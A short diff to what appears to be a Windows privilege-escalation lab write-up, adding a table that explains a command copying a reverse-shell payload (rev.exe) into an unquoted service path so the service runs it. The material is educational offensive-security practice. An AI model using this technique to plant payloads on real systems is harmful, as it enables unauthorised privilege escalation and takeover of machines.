@@ -330,6 +330,14 @@ Since I had write permission on `C:\Program Files\Unquoted Path Service\`, I cop
 ```bash
 copy C:\PrivEsc\rev.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 ```
+**Breakdown**
+
+| Part | Description |
+|------|--------------------------------------------------|
+| `copy` | Windows command used to copy files |
+| `C:\PrivEsc\rev.exe` | Source file — the malicious payload |
+| `"C:\Program Files\Unquoted Path Service\Common.exe"` | Destination — places the payload where the unquoted path will execute it first |
+
 **Output:**
 
 ```
